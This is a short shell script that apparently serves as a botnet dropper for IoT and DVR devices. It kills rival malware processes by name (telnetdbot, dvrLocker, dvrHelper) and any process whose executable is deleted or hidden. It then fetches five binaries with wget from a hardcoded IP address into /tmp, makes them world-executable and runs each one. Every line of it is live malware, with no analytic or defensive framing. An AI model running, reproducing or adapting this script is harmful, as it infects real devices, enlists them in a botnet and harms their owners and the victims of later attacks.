#!/bin/sh
for proc_dir in /proc/[0-9]*; do
    pid=${proc_dir##*/}

    exe_path=$(readlink -f "/proc/$pid/exe" 2> /dev/null)

    if [ -z "$exe_path" ]; then
        continue
    fi

    case "$exe_path" in
        *"(deleted)"* | *"/."* | *"telnetdbot"* | *"dvrLocker"* | *"acd"* | *"dvrHelper"*)
            kill -9 "$pid"
            ;;
    esac
done

cd /tmp; rm -rf n2; wget http://195.177.94.107/n2; chmod 777 n2; ./n2 pdvr;
cd /tmp; rm -rf n3; wget http://195.177.94.107/n3; chmod 777 n3; ./n3 pdvr;
cd /tmp; rm -rf n4t; wget http://195.177.94.107/n4t; chmod 777 n4t; ./n4t pdvr;
cd /tmp; rm -rf n7; wget http://195.177.94.107/n7; chmod 777 n7; ./n7 pdvr;
cd /tmp; rm -rf n8; wget http://195.177.94.107/n8; chmod 777 n8; ./n8 pdvr;
echo "" > p
rm -rf p
